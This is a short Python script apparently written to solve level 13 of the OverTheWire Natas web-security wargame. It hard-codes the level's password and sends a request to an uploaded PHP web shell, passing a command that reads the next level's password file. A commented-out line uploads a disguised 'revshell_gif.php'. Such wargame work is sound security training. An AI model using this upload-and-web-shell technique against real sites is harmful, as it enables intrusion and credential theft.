import requests

user_name = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()


#response = session.get(url, auth = (user_name, password))
response = session.get(url + "/upload/ezt34luxl3.php?c=cat /etc/natas_webpass/natas14", auth = (user_name, password))
#response = session.post(url, data = {"filename" : "revshell_gif.php", "MAX_FILE_SIZE" : "1000"},
#                        auth =  (user_name, password), files = {"uploadedfile" : open("revshell_gif.php", "rb")})
content = response.text


print(content)